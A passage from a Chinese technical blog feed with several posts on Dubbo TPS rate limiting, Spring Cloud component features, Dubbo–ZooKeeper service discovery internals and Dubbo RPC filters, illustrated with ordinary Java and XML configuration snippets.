    <content type="html"><![CDATA[<p>之前写的一个ppt 搬到博客来<br><img src="/img/opensource-code-study/127449-20180801080115377-1977121716.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080118338-629887932.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080120414-948768967.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080123104-1754792910.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080124999-120293532.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080128734-1920470973.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080132635-538189423.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080134524-1270346855.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080136838-1382601997.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080139298-1630640379.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080141375-872510084.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080144213-2125716186.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080145998-50420460.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080147944-720961137.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080154801-795474812.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080157144-742856060.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080159876-1183446078.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080203487-1298114921.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080204867-1834195532.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080209695-1259687480.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080212129-118600843.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080214297-1311209057.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080216799-249321099.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080220352-1208833914.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080235990-366012929.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080243878-882480225.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080304108-1106498363.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080322994-937580077.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080353538-1877723431.jpg" srcset="/img/loading.gif" alt=""></p><p><img src="/img/opensource-code-study/127449-20180801080356802-387170079.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080404884-1913078659.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080410175-425218231.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080417638-925372812.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080423584-2041160784.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080428483-1591692800.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080432721-721748376.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080438547-1912361032.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080445447-1182365593.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080451596-1931521187.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080458160-1707101218.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080504447-171053453.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080508723-1933597399.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080516484-2134754885.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080521794-1738918236.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080526193-152614143.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080531231-2046106514.jpg" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801080538500-51822153.jpg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>JDK源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TPS限流</title>
    <link href="/2020/04/24/tps/"/>
    <url>/2020/04/24/tps/</url>
    
    <content type="html"><![CDATA[<p>限流是高可用服务需要具备的能力之一 ，粗暴简单的就像我们之前做的并发数控制。好一点的有tps限流，可用令牌桶等算法实现。《亿级流量网站架构核心技术》一书P67限流详解也有讲。dubbo提供了此机制，TpsLimitFilter。guava也提供了相应的工具类RateLimiter。<br>#1. dubbo提供的tps限流<br>##1.1 demo使用<br>###1.1.1 在source folder下放置，META-INF/dubbo/com.alibaba.dubbo.rpc.Filter<br>里面写入 tpslimiter=com.alibaba.dubbo.rpc.filter.TpsLimitFilter<br>表示将TpsLimitFilter这个filter的扩展给装配给dubbo  </p><p>###1.1.2 provider侧的配置  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:service</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.HelloService"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"m00001.app001.xx.helloService"</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">"tpslimiter"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"tps"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"5"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dubbo:service</span>&gt;</span></code></pre><p>意思对HelloService 这个接口在provider侧做tps为5的限流，默认间隔是60s，可以通过<code>tps.interval</code>这个parameter进行配置，单位是毫秒。注意此处配置的tps为5，<code>不是</code>每秒限制通过5个以内的请求，而是<code>单位时间间隔内</code>通过5个以内的请求。关于单位时间间隔前面解释了。  </p><p>##1.2 如果超限了是什么现象？<br>客户端会抛出rpc调用异常：<br>com.alibaba.dubbo.rpc.RpcException: Failed to invoke service org.simonme.dubbo.demo.provider.service.HelloService.sayHello because exceed max service tps  </p><p>##1.3 原理分析<br>主要是<code>DefaultTPSLimiter</code>和<code>StatItem</code>两个类配合完成。采用的是<code>令牌桶</code>算法，实现在<code>StatItem</code>类中。<br>大意是：<br>每隔一个单位时间后重置令牌桶中令牌的数量，然后每次请求来的时候减1，减到小于0时，拒绝请求。  </p><pre><code class="hljs java"><span class="hljs-keyword">long</span> now = System.currentTimeMillis();<span class="hljs-keyword">if</span> (now &gt; lastResetTime + interval) &#123;    token.set(rate);    lastResetTime = now;&#125;<span class="hljs-keyword">int</span> value = token.get();<span class="hljs-keyword">boolean</span> flag = <span class="hljs-keyword">false</span>;<span class="hljs-keyword">while</span> (value &gt; <span class="hljs-number">0</span> &amp;&amp; !flag) &#123;    flag = token.compareAndSet(value, value - <span class="hljs-number">1</span>);    value = token.get();&#125;</code></pre><p>注意：此实现依赖系统时间，如果想用相对时间实现，可以参见<a href="https://github.com/apache/incubator-dubbo/issues/2345" target="_blank" rel="noopener">这里 dubbo的TPS限流模块在运行时系统时间发生变化的情况下限流不能正常工作 #2345</a>。  </p><p>#2. spring cloud<br>对于采用spring cloud的架构的项目，可以借助guava的<code>RateLimiter</code>来实现<code>ZuulFilter</code>的子类来达成tps限流的目的。</p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>分布式系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring Cloud(2.0)能力大致列表</title>
    <link href="/2020/04/24/spring-cloud2-features/"/>
    <url>/2020/04/24/spring-cloud2-features/</url>
    
    <content type="html"><![CDATA[<p>#微服务九大特性<br>出自Martin Fowler的《Microservices》  </p><ol><li>服务组件化  </li><li>按业务组织团队  </li><li>做“产品”的态度  </li><li>智能端点与哑管道  </li><li>去中心化治理  </li><li>去中心化管理数据  </li><li>基础设施自动化  </li><li>容错设计  </li><li>演进式设计  </li></ol><p>#Spring Boot特性</p><ol><li>支持main方法直接拉起嵌入式web容器  </li><li>本地配置方式更友好，支持占位符 支持profile，支持启动参数覆盖等，支持自动配置  </li><li>支持自动装配等 </li></ol><p>#Eureka的特性</p><ol><li>服务发现的server与client，即支持注册与发现能力。    </li><li><code>高可用</code>，可以两个(或以上)节点相互备份，通过eureka.client.serviceUrl.defaultZone配置其他两个节点的url。server既是server也是client。    </li><li>通过注解启用注册中心server端能力 <code>EnableEurekaServer</code>  </li><li>需要注册的provider端只要在classpath下放spring-cloud-starter-netflix-eureka-client相关依赖，那么provider就可以自动注册到eureka注册中心。当然了需要在配置文件中配置eureka服务的url地址，配置项的key是eureka.client.serviceUrl.defaultZone。  </li><li>server支持配置多长时间扫描一次失效服务  </li><li>client端支持配置多长时间给server发一次心跳，支持配置多长时间没有收到心跳就移除服务列表  </li><li>注册与发现时支持密码鉴权  </li><li>支持多注册中心分组  </li></ol><p>#Ribbon特性</p><ol><li>客户端负载均衡器，客户端自己维护要访问的服务端清单，比如来自于注册中心 </li><li>提供spring-cloud-starter-netflix-ribbon  artifact ID 用于引入ribbon  </li><li>提供ribbon+RestTemplate的客户端负载均衡方式，那当然也提供了客户端。    </li><li>用心跳去维护服务端清单的健康行，支持弹性失败  </li><li>多种可插拔负载均衡规则： 轮询，随机，区域感知轮询，响应时间权重，具体参加com.netflix.loadbalancer.IRule的实现    </li><li>支持ribbon.MaxAutoRetries 最大重试次数配置  </li><li>支持配置是否所有操作都能重试  </li><li>支持配置 刷新服务端列表的时间  </li><li>支持配置读超时 与 连接超时 (针对HttpClient)  </li><li>支持配置初始化的服务端列表  </li><li>支持自定义RibbonClient  </li><li>支持自定义负载均衡策略<br><a href="https://github.com/Netflix/ribbon/wiki" target="_blank" rel="noopener">Netflix ribbon自己的wiki</a>写的更清晰一些。  </li></ol><p>#Hystrix特性</p><ol><li>支持用spring-cloud-starter-netflix-hystrix  和 EnableCircuitBreaker 注解完成hystrix引入  </li><li>支持指定fallBack时的方法，方法参数与服务方法参数相同(也就是支持参数传递)  </li><li>支持 全局默认配置 动态全局配置 实例默认配置 实例动态配置 四个层次的配置覆盖能力  </li><li>支持用execution.isolation.strategy配置隔离策略，支持线程(默认)和信号量方式的隔离  </li><li>支持用execution.isolation.thread.timeoutInMilliseconds指定线程执行多长时间超时然后出发fallback，默认值1000ms  </li><li>支持用execution.timeout.enabled配置是否需要启用线程执行超时机制，默认true  </li><li>支持用execution.isolation.thread.interruptOnTimeout指定线程执行超时后是否终端，默认是true  </li><li>支持用execution.isolation.thread.interruptOnCancel指定取消发生时是否要终端线程，默认false  </li><li>支持用execution.isolation.semaphore.maxConcurrentRequests配置信号量模式下的最大并发请求数，默认10  </li><li>支持fallback.isolation.semaphore.maxConcurrentRequests在信号量模式下callback最大并发请求数， 默认10  </li><li>支持用fallback.enabled 指定是否启用fallback，默认true  </li><li>支持用circuitBreaker.enabled 指定是否启用断路器 默认true  </li><li>支持用circuitBreaker.requestVolumeThreshold配置 一个滑动窗口内 多少个请求失败后再启用断路器，默认是20  </li><li>支持用circuitBreaker.sleepWindowInMilliseconds配置断路器被触发后生效多少时间，默认5s  </li><li>支持用circuitBreaker.errorThresholdPercentage 配置失败百分比达到多少时启用断路器并触发fallback逻辑</li><li>支持用circuitBreaker.forceOpen配置在所有服务失败时是否强制开启断路器，默认是false  </li><li>支持用metrics.rollingStats.timeInMilliseconds配置时间窗口时长(断路器要根据单位时间内的失败数量或者比率来决定是否启用)，默认10s  </li><li>支持用metrics.rollingStats.numBuckets设置桶的数量，默认是10  </li><li>支持用requestCache.enabled配置是否启用缓存，在command有getCacheKey() 方法是默认启用此特性。 用@CacheResult注解配合@HystrixCommand注解可以开启缓存，默认是所有方法参数作为key，也可以通过cacheKeyMethod制定getkey方法，也可以使用@CacheKey注解加载服务方法的参数上作为缓存的key，用@CacheRemove注解关闭缓存。 可以参见<a href="https://segmentfault.com/a/1190000011280116" target="_blank" rel="noopener">这里</a> </li><li>支持请求合并。 支持maxRequestsInBatch配置合并批次中的请求数。  支持timerDelayInMilliseconds配置延迟时间，默认10ms。</li><li>支持线程池相关属性配置。  </li><li>支持dashboard<br>所有的详细配置可参见<a href="http://tietang.wang/2016/02/25/hystrix/Hystrix%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">这里</a>和<a href="https://github.com/Netflix/Hystrix/wiki/Configuration" target="_blank" rel="noopener">这里</a>   </li></ol><p>#Feign特性</p><ol><li>支持用定义接口的方式替换了写代码实现远程client调用的代码  </li><li>支持从请求header中拿参数作为调用远程服务的请求参数  </li><li>支持用ribbon和hystrix实现负载均衡与服务降级  </li><li>支持client的日志级别配置  </li></ol><p>#Zuul特性</p><ol><li>支持转发，支持转发路由规则配置  </li><li>支持请求过滤，ZuulFilter，自带了多种实现  </li><li>支持动态路由配置，需要配合spring cloud使用  </li><li>支持动态过滤器，groovy脚本</li></ol><p>#config特性</p><ol><li>可以对接git、svn、本地文件存储  </li><li>支持高可用，用eureka或者config server都指向同一git仓库  </li><li>支持配置项加密，支持密钥配置  </li><li>支持动态刷新配置</li></ol>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>分布式系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dubbo与zk注册中心如何对接，如何做到服务自动发现</title>
    <link href="/2020/04/24/dubbo-zk/"/>
    <url>/2020/04/24/dubbo-zk/</url>
    
    <content type="html"><![CDATA[<p>先看下consumer端发起调用时的链路流程：  </p><pre><code class="hljs html"> +---------------------------+            +---------------------------+            +---------------------------+               |      helloService         |            |      proxy                |            |  InvokerInvocationHandler |               |      sayHello             +----------&gt; |      sayHello             +----------&gt; |  invoke                   |               |                           |            |                           |            |  proxy method args        |               +---------------------------+            +---------------------------+            +-------------+-------------+                                                                                                               |                                                                                                                             |                                                                                                              +---------------------------------+                                                                                           |              |                  |                                                                                           | +------------v--------------+   |                                                                                           | |  MockClusterInvoker       |   |                                                                                           | |  invoke                   |   |                                                                                           | |                           |   |                                                                                           | +------------+--------------+   |                                                                                           |              |                  |                                                                                           |              |                  |                                                                                           |              |                  |          +---------------------------+            +---------------------------+           | +------------v--------------+   |          | Router                    |            | RegistryDirectory         |           | |  FailoverClusterInvoker   |   |          | route                     | &lt;----------+ list                      | &lt;-----------+  invoke                   |   |          | MockInVokersSelector      |            | INVOCATION--&gt;List INVOKER |           | |                           |   |          +------------+--------------+            +---------------------------+           | +---------------------------+   |                       |                                                                   |                                 |                       |                                                                   +---------------------------------+                       |                                                                 cluster invoke，分布式调用容错机制也是在这做                                    |                                                                                                                             |                                                                                                                             |                                                                                                                             |                                                                                                                             |                                                                                                               +-------------v-------------+             +---------------------------+             +---------------------------+             |  RandomLoadBalance        |             |InvokerDelegate            |             | ListenerInvokerWrap       |             |  select                   +-----------&gt; |invoke                     +-----------&gt; | invoke                    |             |  List INVOKER--&gt;INVOKER   |             |                           |             |                           |             +---------------------------+             +---------------------------+             +---------------------------+</code></pre><p>#1. 引入zookeeper作为注册中心后，服务查找过程<br>从建立spring到netty client建立连接的调用栈：<br>NettyClient.doOpen() line: 66<br>NettyClient(AbstractClient).<init>(URL, ChannelHandler) line: 94<br>NettyClient.<init>(URL, ChannelHandler) line: 61<br>NettyTransporter.connect(URL, ChannelHandler) line: 37<br>Transporter$Adpative.connect(URL, ChannelHandler) line: not available<br>Transporters.connect(URL, ChannelHandler…) line: 67<br>HeaderExchanger.connect(URL, ExchangeHandler) line: 37<br>Exchangers.connect(URL, ExchangeHandler) line: 102<br>DubboProtocol.initClient(URL) line: 378<br>DubboProtocol.getSharedClient(URL) line: 344<br>DubboProtocol.getClients(URL) line: 321<br>DubboProtocol.refer(Class<T>, URL) line: 303<br>ProtocolListenerWrapper.refer(Class<T>, URL) line: 65<br>ProtocolFilterWrapper.refer(Class<T>, URL) line: 62<br>Protocol$Adpative.refer(Class, URL) line: not available<br>RegistryDirectory<T>.toInvokers(List<URL>) line: 405<br>RegistryDirectory<T>.refreshInvoker(List<URL>) line: 228<br>RegistryDirectory<T>.notify(List<URL>) line: 196<br>ZookeeperRegistry(AbstractRegistry).notify(URL, NotifyListener, List<URL>) line: 449<br>ZookeeperRegistry(FailbackRegistry).doNotify(URL, NotifyListener, List<URL>) line: 273<br>ZookeeperRegistry(FailbackRegistry).notify(URL, NotifyListener, List<URL>) line: 259<br>ZookeeperRegistry.doSubscribe(URL, NotifyListener) line: 170<br>ZookeeperRegistry(FailbackRegistry).subscribe(URL, NotifyListener) line: 189<br>RegistryDirectory<T>.subscribe(URL) line: 134<br>RegistryProtocol.doRefer(Cluster, Registry, Class<T>, URL) line: 271<br>RegistryProtocol.refer(Class<T>, URL) line: 254<br>ProtocolListenerWrapper.refer(Class<T>, URL) line: 63<br>ProtocolFilterWrapper.refer(Class<T>, URL) line: 60<br>Protocol$Adpative.refer(Class, URL) line: not available<br>ReferenceBean<T>(ReferenceConfig<T>).createProxy() line: 394<br>ReferenceBean<T>(ReferenceConfig<T>).init() line: 303<br>ReferenceBean<T>(ReferenceConfig<T>).get() line: 138<br>ReferenceBean<T>.getObject() line: 65<br>DefaultListableBeanFactory(FactoryBeanRegistrySupport).doGetObjectFromFactoryBean(FactoryBean, String, boolean) line: 142    </p><p>整体来说： 先由注册中心的协议处理器处理注册中心的地址，找到所有provider的地址，创建所有invoker，然后再由invoker在真正调用时发起调用。<br>注册中心的这个也抽象一种协议，由注册中心结合提供者的协议推导出提供者的协议地址，也就是目标端的地址与端口得知了。<br>每一个接口在zookeeper上都有节点，节点下面是provider，再下面是所有provider的具体地址。</p><p>#2. netty client的基本步骤<br>创建channelPipelineFactory，并在这个factory中返回加工好的ChannelPipeline，加工过程包括加入编解码器，连接事件处理组成的netty handler实现<br>（包括连接建立，断开，请求写出去，）</p><p>writeRequested(netty的)–&gt;调用编码器（编码的这个对象中包括了 需要调用的目标接口名  方法名等信息）<br>（继承SimpleChannelHandler重写逻辑，可以定制channel的读取与写出逻辑）</p><p>#3. 在使用zookeeper作为注册中心时，如果有provider服务停掉， consumer端如何感知？再次启动刚停掉的provider呢？<br>provider停掉会触发zk客户端的监听，监听对客户端的invoker列表进行刷新。<br>再次启动会触发 zk的监听，代码在<code>ZkclientZookeeperClient</code></p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> IZkChildListener <span class="hljs-title">createTargetChildListener</span><span class="hljs-params">(String path, <span class="hljs-keyword">final</span> ChildListener listener)</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> IZkChildListener() &#123;<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleChildChange</span><span class="hljs-params">(String parentPath, List&lt;String&gt; currentChilds)</span></span><span class="hljs-function"><span class="hljs-keyword">throws</span> Exception </span>&#123;listener.childChanged(parentPath, currentChilds);&#125;&#125;;&#125;</code></pre><p>然后再触发 com.alibaba.dubbo.registry.support.FailbackRegistry.doNotify(URL, NotifyListener, List<URL>)。<br>com.alibaba.dubbo.registry.integration.RegistryDirectory.refreshInvoker(List<URL>)， 这是在zk的event线程完成的。<br>如果有provider停掉了 走一样的监听逻辑</p><p>同时，dubbo支持 定时检查provider的状态并进行重连，具体参见<br>com.alibaba.dubbo.remoting.transport.AbstractClient.initConnectStatusCheckCommand()<br>reconnectExecutorService.scheduleWithFixedDelay(connectStatusCheckCommand, reconnect, reconnect, TimeUnit.MILLISECONDS);</p><p>#4. 如果正在发服务的时候，provider停掉了，dubbo是如何处理的？<br>如果在发服务时，provider停掉了，那么此时会抛出异常，并在FailoverClusterInvoker doInvoke中捕获，<br>FailoverClusterInvoker支持调用失败时重试(可配置)，此时达到再次重试的目的。</p><p>#5. client在多次调用时，与provider端的连接是建立几次，在prodvider端服务状态有变化时呢？<br>NettyClient 的doOpen doConnect均在初始化的时候调用，有几个provider就调用几次，真正rpc调用服务的时候是不会再调用open与connect的。<br>上面这个说法不严格，因为看他发送消息的代码就知道了，每次发消息时还会检查下：</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">send</span><span class="hljs-params">(Object message, <span class="hljs-keyword">boolean</span> sent)</span> <span class="hljs-keyword">throws</span> RemotingException </span>&#123;    <span class="hljs-keyword">if</span> (send_reconnect &amp;&amp; !isConnected())&#123;        connect();    &#125;    Channel channel = getChannel();    <span class="hljs-comment">//TODO getChannel返回的状态是否包含null需要改进</span>    <span class="hljs-keyword">if</span> (channel == <span class="hljs-keyword">null</span> || ! channel.isConnected()) &#123;      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RemotingException(<span class="hljs-keyword">this</span>, <span class="hljs-string">"message can not send, because channel is closed . url:"</span> + getUrl());    &#125;    channel.send(message, sent);&#125;</code></pre><p>#6. 对于多个provider，dubbo默认在哪里选择了一个invoker进行调用的<br>com.alibaba.dubbo.rpc.cluster.support.AbstractClusterInvoker.select(LoadBalance, Invocation, List&lt;Invoker<T>&gt;, List&lt;Invoker<T>&gt;)。</p><p>com.alibaba.dubbo.rpc.filter.EchoFilter@1fd14d74<br>com.alibaba.dubbo.rpc.filter.ClassLoaderFilter@563e4951<br>com.alibaba.dubbo.rpc.filter.GenericFilter@4066c471<br>com.alibaba.dubbo.rpc.filter.ContextFilter@2b175c00<br>com.alibaba.dubbo.rpc.protocol.dubbo.filter.TraceFilter@3eb81efb<br>com.alibaba.dubbo.rpc.filter.TimeoutFilter@1ae8bcbc<br>com.alibaba.dubbo.monitor.support.MonitorFilter@6cdba6dc<br>com.alibaba.dubbo.rpc.filter.ExceptionFilter@2609b277</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dubbo rpc filter实现剖析(一)</title>
    <link href="/2020/04/24/dubbo-rpc-filter-1/"/>
    <url>/2020/04/24/dubbo-rpc-filter-1/</url>
    
    <content type="html"><![CDATA[<p>2.6.3版本，之前读的是2.4.9版本<br>本篇主要阐述dubbo rpc的filter的实现，包括作用，用法，原理，与Spring Cloud在这些能力的对比。  </p><h1 id="共提供了多少个？是哪些-发布时默认装配了哪些给他自身的扩展点机制？"><a href="#共提供了多少个？是哪些-发布时默认装配了哪些给他自身的扩展点机制？" class="headerlink" title="共提供了多少个？是哪些?发布时默认装配了哪些给他自身的扩展点机制？"></a>共提供了多少个？是哪些?发布时默认装配了哪些给他自身的扩展点机制？</h1><p>从类与接口关系分析的结果文档中可以看到共20个：<br>241 Filter<br>–241.1 CacheFilter<br>–241.2 MonitorFilter<br>–241.3 AccessLogFilter<br>–241.4 ActiveLimitFilter<br>–241.5 ClassLoaderFilter<br>–241.6 CompatibleFilter<br>–241.7 ConsumerContextFilter<br>–241.8 ContextFilter<br>–241.9 DeprecatedFilter<br>–241.10 EchoFilter<br>–241.11 ExceptionFilter<br>–241.12 ExecuteLimitFilter<br>–241.13 GenericFilter<br>–241.14 GenericImplFilter<br>–241.15 TimeoutFilter<br>–241.16 TokenFilter<br>–241.17 TpsLimitFilter<br>–241.18 FutureFilter<br>–241.19 TraceFilter<br>–241.20 ValidationFilter  </p><p>从发布的jar中的META-INF/dubbo/internal/com.alibaba.dubbo.rpc.Filter中发现除了TpsLimitFilter之外，其余的都装上了。<br>cache=com.alibaba.dubbo.cache.filter.CacheFilter<br>validation=com.alibaba.dubbo.validation.filter.ValidationFilter<br>echo=com.alibaba.dubbo.rpc.filter.EchoFilter<br>generic=com.alibaba.dubbo.rpc.filter.GenericFilter<br>genericimpl=com.alibaba.dubbo.rpc.filter.GenericImplFilter<br>token=com.alibaba.dubbo.rpc.filter.TokenFilter<br>accesslog=com.alibaba.dubbo.rpc.filter.AccessLogFilter<br>activelimit=com.alibaba.dubbo.rpc.filter.ActiveLimitFilter<br>classloader=com.alibaba.dubbo.rpc.filter.ClassLoaderFilter<br>context=com.alibaba.dubbo.rpc.filter.ContextFilter<br>consumercontext=com.alibaba.dubbo.rpc.filter.ConsumerContextFilter<br>exception=com.alibaba.dubbo.rpc.filter.ExceptionFilter<br>executelimit=com.alibaba.dubbo.rpc.filter.ExecuteLimitFilter<br>deprecated=com.alibaba.dubbo.rpc.filter.DeprecatedFilter<br>compatible=com.alibaba.dubbo.rpc.filter.CompatibleFilter<br>timeout=com.alibaba.dubbo.rpc.filter.TimeoutFilter<br>trace=com.alibaba.dubbo.rpc.protocol.dubbo.filter.TraceFilter<br>future=com.alibaba.dubbo.rpc.protocol.dubbo.filter.FutureFilter<br>monitor=com.alibaba.dubbo.monitor.support.MonitorFilter  </p><h1 id="这些filter都有什么作用？如何使用？实现原理是什么？Spring-Cloud是否也提供了这些能力？有什么差异？"><a href="#这些filter都有什么作用？如何使用？实现原理是什么？Spring-Cloud是否也提供了这些能力？有什么差异？" class="headerlink" title="这些filter都有什么作用？如何使用？实现原理是什么？Spring Cloud是否也提供了这些能力？有什么差异？"></a>这些filter都有什么作用？如何使用？实现原理是什么？Spring Cloud是否也提供了这些能力？有什么差异？</h1><a id="more"></a><h2 id="CacheFilter"><a href="#CacheFilter" class="headerlink" title="CacheFilter"></a>CacheFilter</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>缓存调用结果，比如配置在consumer端， 比如我们通过id查某个用户的信息，对于特定的一个id，在consumer端第一次调用时会给provider端发请求，后面再调用时，直接用consumer端缓存的结果返回，你不再发请求给provider端。  </p><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p>consumer侧的配置：  </p><p>&lt;dubbo:reference id=”userService” interface=”org.simonme.dubbo.demo.provider.service.UserService” filter=”cache”&gt;<br>    &lt;dubbo:parameter key=”cache” value=”lru” /&gt;<br></dubbo:reference>  </p><p>能支持的全部cache定义在META-INF/dubbo/internal/com.alibaba.dubbo.cache.CacheFactory 当然你也可以遵循dubbo扩展点机制进行扩展。<br>默认提供三种：<br>threadlocal=com.alibaba.dubbo.cache.support.threadlocal.ThreadLocalCacheFactory<br>lru=com.alibaba.dubbo.cache.support.lru.LruCacheFactory<br>jcache=com.alibaba.dubbo.cache.support.jcache.JCacheFactory  </p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p><code>缓存的key</code>是你远程方法调用时传递的所有参数按<code>规则</code>组装成字符串作为key。<br>具体规则就是： 基本类型 直接拼接，复合类型转成json字符串后再拼接。  </p><p>实现原理也不是很复杂，根据invoker的url找到其对应的cache对象，再跟据上述<code>缓存的key</code>找到缓存的结果。<br>有个不是太要紧的小问题，因为是根据invoker的url找到其对应的cache对象的，又因为invoker的url中含有remote.timestamp参数，所以你如果启用了consumer侧的缓存，consumer一直在服务状态，此时provider服务做了重启，那么consumer侧的缓存失效，会重新调用provider端。  </p><p>ThreadLocalCache 是ThreadLocal配合HashMap实现<br>LRUCache 是继承自LinkedHashMap，同时结合ReentrantLock实现的线程安全的lru cache(最近最少使用)，LinkedHashMap自带lru性质，通过构造参数控制，默认是fifo。<br>jache是封装的JCache API (JSR 107)。    </p><h3 id="与Spring-Cloud对比"><a href="#与Spring-Cloud对比" class="headerlink" title="与Spring Cloud对比"></a>与Spring Cloud对比</h3><p>Spring Cloud提供了consumer侧的缓存能力，<code>Hystrix</code>组件支持用requestCache.enabled配置是否启用缓存，也支持用cacheKeyMethod注解指定getkey方法。  </p><h2 id="ValidationFilter"><a href="#ValidationFilter" class="headerlink" title="ValidationFilter"></a>ValidationFilter</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>在consumer和provider端提供了校验能力</p><h3 id="使用方式-1"><a href="#使用方式-1" class="headerlink" title="使用方式"></a>使用方式</h3><p>假设你要对consumer端进行校验，在配置文件中配置如下：  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dubbo:reference</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"userService"</span> <span class="hljs-attr">interface</span>=<span class="hljs-string">"org.simonme.dubbo.demo.provider.service.UserService"</span> <span class="hljs-attr">filter</span>=<span class="hljs-string">"validation"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dubbo:parameter</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"validation"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"JValidator"</span> /&gt;</span>        <span class="hljs-comment">&lt;!-- 配置一个实现了javax.validation.spi.ValidationProvider&lt;T&gt;接口校验器 --&gt;</span>    <span 